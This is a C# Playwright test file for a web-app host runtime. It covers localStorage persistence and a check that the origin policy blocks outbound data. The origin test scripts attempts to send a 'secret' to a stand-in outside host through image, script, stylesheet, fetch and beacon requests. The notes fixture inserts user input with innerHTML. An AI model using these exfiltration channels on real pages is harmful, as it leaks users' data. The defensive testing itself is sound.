using Microsoft.Playwright;

namespace Bohm.Runtime.Tests.Host;

/// <summary>
/// The injected script in a real Chromium-family browser (the installed Microsoft Edge, which is
/// what the desktop web view is built on). Skipped where Edge is not installed.
/// </summary>
[Collection("browser")]
public sealed class BrowserTests : IAsyncLifetime
{
    private const string NotesApp = """
        <!doctype html>
        <html><head><meta charset="utf-8"><title>Notes</title></head>
        <body>
          <input id="note"><button id="save">Save</button>
          <ul id="list"></ul>
          <script>
            const notes = JSON.parse(localStorage.getItem('notes') || '[]');
            const render = () => { document.getElementById('list').innerHTML = notes.map(n => '<li>' + n + '</li>').join(''); };
            document.getElementById('save').onclick = () => {
              notes.push(document.getElementById('note').value);
              localStorage.setItem('notes', JSON.stringify(notes));
              localStorage.lastSaved = String(notes.length);
              render();
            };
            render();
          </script>
        </body></html>
        """;

    private RunningHost _host = null!;
    private IPlaywright _playwright = null!;
    private IBrowser? _browser;

    public async ValueTask InitializeAsync()
    {
        _host = await RunningHost.StartAsync();
        _playwright = await Playwright.CreateAsync();
        try
        {
            _browser = await _playwright.Chromium.LaunchAsync(new() { Channel = "msedge" });
        }
        catch (PlaywrightException)
        {
            _browser = null;
        }
    }

    public async ValueTask DisposeAsync()
    {
        if (_browser is not null) await _browser.DisposeAsync();
        _playwright.Dispose();
        await _host.DisposeAsync();
    }

    [Fact]
    public async Task An_unmodified_app_keeps_its_data_across_reloads_and_a_host_restart()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync(NotesApp);

        var page = await OpenAsync(id);
        await page.FillAsync("#note", "우유 사기");
        await page.ClickAsync("#save");
        await page.FillAsync("#note", "buy bread");
        await page.ClickAsync("#save");
        await ReloadUntilAsync(page, "localStorage.getItem('notes') && JSON.parse(localStorage.getItem('notes')).length === 2");

        Assert.Equal(["우유 사기", "buy bread"], await page.Locator("#list li").AllInnerTextsAsync());
        Assert.Equal("2", await page.EvaluateAsync<string>("localStorage.lastSaved"));
        await page.CloseAsync();

        await _host.StopKeepingDataAsync();
        _host = await RunningHost.StartAsync(_host.DataRoot);

        var afterRestart = await OpenAsync(id);
        Assert.Equal(["우유 사기", "buy bread"], await afterRestart.Locator("#list li").AllInnerTextsAsync());
    }

    [Fact]
    public async Task A_write_made_while_the_page_is_closing_is_kept()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("""
            <!doctype html><title>Draft</title>
            <script>addEventListener('pagehide', () => localStorage.setItem('draft', 'written at close'));</script>
            """);

        var page = await OpenAsync(id);
        await page.CloseAsync(new() { RunBeforeUnload = true });

        // The window closed but the browser (the application's process) is still running — the
        // case where the final request must still arrive.
        var check = await OpenAsync(id);
        await ReloadUntilAsync(check, "localStorage.getItem('draft') !== null");
        Assert.Equal("written at close", await check.EvaluateAsync<string?>("localStorage.getItem('draft')"));
    }

    [Fact]
    public async Task Web_storage_semantics_hold_for_common_access_patterns()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("<!doctype html><title>t</title>");
        var page = await OpenAsync(id);

        var result = await page.EvaluateAsync<string>("""
            () => {
              localStorage.clear();
              localStorage.setItem('a', 1);
              localStorage.b = 'two';
              localStorage['c'] = 'three';
              delete localStorage.c;
              return JSON.stringify({
                a: localStorage.getItem('a'), b: localStorage.b, missing: localStorage.getItem('nope'),
                length: localStorage.length, keys: Object.keys(localStorage), first: localStorage.key(0),
                hasB: 'b' in localStorage, json: JSON.parse(JSON.stringify(localStorage)),
              });
            }
            """);

        Assert.Equal("""{"a":"1","b":"two","missing":null,"length":2,"keys":["a","b"],"first":"a","hasB":true,"json":{"a":"1","b":"two"}}""", result);
    }

    [Fact]
    public async Task Data_cannot_leave_the_origin_through_any_request_type()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var elsewhere = $"http://outside.localhost:{_host.Port}";
        var id = await _host.AdoptAsync("<!doctype html><title>x</title>");
        var page = await OpenAsync(id);
        // A request the policy refuses still raises Playwright's Request event (the browser creates
        // it before checking policy), so what counts is how each one ended: refused, or answered.
        var answered = new List<string>();
        var refused = new List<string>();
        page.RequestFinished += (_, request) => { if (request.Url.StartsWith(elsewhere, StringComparison.Ordinal)) answered.Add(request.Url); };
        page.RequestFailed += (_, request) => { if (request.Url.StartsWith(elsewhere, StringComparison.Ordinal)) refused.Add($"{request.Url} {request.Failure}"); };

        var violations = await page.EvaluateAsync<int>($$"""
            async () => {
              let count = 0;
              document.addEventListener('securitypolicyviolation', () => count++);
              const secret = encodeURIComponent('secret');
              const img = new Image(); img.src = '{{elsewhere}}/img?d=' + secret;
              const script = document.createElement('script'); script.src = '{{elsewhere}}/js?d=' + secret; document.head.append(script);
              const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = '{{elsewhere}}/css?d=' + secret; document.head.append(link);
              try { await fetch('{{elsewhere}}/fetch?d=' + secret, { mode: 'no-cors' }); } catch {}
              navigator.sendBeacon('{{elsewhere}}/beacon', secret);
              await new Promise(r => setTimeout(r, 500));
              return count;
            }
            """);

        Assert.Empty(answered);
        Assert.All(refused, r => Assert.EndsWith(" csp", r, StringComparison.Ordinal));
        Assert.True(violations >= 4, $"expected every attempt to be refused by policy, saw {violations}");
    }

    private async Task<IPage> OpenAsync(string appId)
    {
        var page = await _browser!.NewPageAsync();
        await page.GotoAsync($"http://{appId}.localhost:{_host.Port}/");
        return page;
    }

    /// <summary>
    /// Reloads until <paramref name="condition"/> holds on a fresh load — i.e. until the data has
    /// reached the runtime, since each load is seeded from what the runtime has stored. Delivery is
    /// asynchronous by design, so a single immediate reload would race it.
    /// </summary>
    private static async Task ReloadUntilAsync(IPage page, string condition)
    {
        for (var attempt = 0; attempt < 25; attempt++)
        {
            await page.ReloadAsync();
            if (await page.EvaluateAsync<bool>(condition)) return;
            await Task.Delay(200);
        }

        Assert.Fail($"Still not true after reloading: {condition}");
    }
}
